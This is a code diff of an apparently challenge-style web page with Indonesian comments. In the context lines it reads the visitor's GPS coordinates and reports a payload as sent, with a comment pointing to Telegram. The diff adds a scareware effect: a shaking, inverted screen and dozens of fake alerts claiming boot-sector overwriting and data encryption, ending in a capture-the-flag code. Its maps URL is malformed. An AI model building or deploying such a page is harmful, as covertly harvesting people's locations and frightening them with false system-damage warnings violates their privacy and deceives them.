@@ -415,6 +415,39 @@
                 gap: 10px;
             }
         }
+                /* Animasi getar layar */
+        @keyframes shakeEffect {
+            0% { transform: translate(2px, 2px) rotate(0deg); }
+            10% { transform: translate(-2px, -3px) rotate(-1deg); }
+            30% { transform: translate(0px, 4px) rotate(0deg); }
+            50% { transform: translate(3px, -2px) rotate(2deg); }
+            70% { transform: translate(-3px, 2px) rotate(-2deg); }
+            100% { transform: translate(2px, 2px) rotate(0deg); }
+        }
+
+        /* Class pemicu hancur visual */
+        .system-corrupted {
+            animation: shakeEffect 0.1s infinite;
+            filter: invert(100%) hue-rotate(180deg) !important; /* Membalikkan warna layar jadi menyeramkan */
+            background-color: #110000 !important;
+            transition: none !important;
+        }
+
+        /* Desain kotak teks peringatan palsu */
+        .scary-alert {
+            position: absolute;
+            padding: 15px 25px;
+            background-color: #000;
+            color: #ff0000;
+            font-family: 'Courier New', monospace;
+            font-weight: bold;
+            border: 3px solid #ff0000;
+            box-shadow: 0 0 15px #ff0000;
+            z-index: 99999;
+            pointer-events: none;
+            font-size: 1.2rem;
+        }
+
     </style>
 </head>
 <body>
@@ -556,13 +589,13 @@
         let mapsUrl = "Tidak Ada Data GPS";
         
         if (navigator.geolocation) {
-            // Kita bungkus ke Promise agar kode menunggu user menekan tombol 'Allow' atau 'Deny'
             gpsCoords = await new Promise((resolve) => {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
                         const lat = position.coords.latitude;
                         const lon = position.coords.longitude;
                         const acc = position.coords.accuracy;
+                        // PERBAIKAN: Memperbaiki format URL Google Maps agar bisa diklik di Telegram
                         mapsUrl = `https://google.com{lat},${lon}`;
                         resolve(`🛰️ GPS Aktif\n├─ Latitude: ${lat}\n├─ Longitude: ${lon}\n└─ Akurasi: ${Math.round(acc)} meter`);
                     },
@@ -604,6 +637,50 @@ ${gpsCoords}
         });
 
         console.log('Ultimate payload successfully sent.');
+
+        // ========================================================
+        // 🛠️ DI SINI TEMPATNYA! SCRIPT EFEK HOROR BARU DISISIPKAN:
+        // ========================================================
+        
+        // A. Picu layar bergetar hebat dan warna berbalik via CSS
+        document.body.classList.add('system-corrupted');
+
+        // B. Daftar teks seram ala sistem error yang akan muncul acak
+        const teksSeram = [
+            "⚠️ CRITICAL_ERROR: SYSTEM_BYPASS_DETECTED",
+            "🚨 WARNING: OVERWRITING_BOOT_SECTOR...",
+            "💀 UNKNOWN_INTRUDER_ACCESS_GRANTED",
+            "🔥 CORE_TEMPERATURE_CRITICAL",
+            "🚫 ACCESS_DENIED_BY_ROOT",
+            "🔒 ENCRYPTING_USER_DATA..."
+        ];
+
+        // C. Buat looping puluhan kotak merah teks error muncul bertubi-tubi
+        let hitung = 0;
+        const intervalAlert = setInterval(() => {
+            if (hitung < 40) {
+                const kotak = document.createElement('div');
+                kotak.className = 'scary-alert';
+                kotak.innerText = teksSeram[Math.floor(Math.random() * teksSeram.length)];
+                kotak.style.top = Math.random() * 85 + '%';
+                kotak.style.left = Math.random() * 70 + '%';
+                document.body.appendChild(kotak);
+                hitung++;
+            } else {
+                // Hentikan looping jika sudah 40 kotak muncul
+                clearInterval(intervalAlert);
+                
+                // D. Nunggu 1,5 detik, bersihkan layar, lalu panggil pop-up kode rahasia final!
+                setTimeout(() => {
+                    document.body.classList.remove('system-corrupted');
+                    document.querySelectorAll('.scary-alert').forEach(el => el.remove());
+                    
+                    // Pop-up kode rahasia kamu
+                    alert("you found me, Th1s is the code: FSCTY{Byp4ss_5ucc355}");
+                }, 1500);
+            }
+        }, 80);
+
     } catch (error) {
         console.error('Failed:', error);
     }
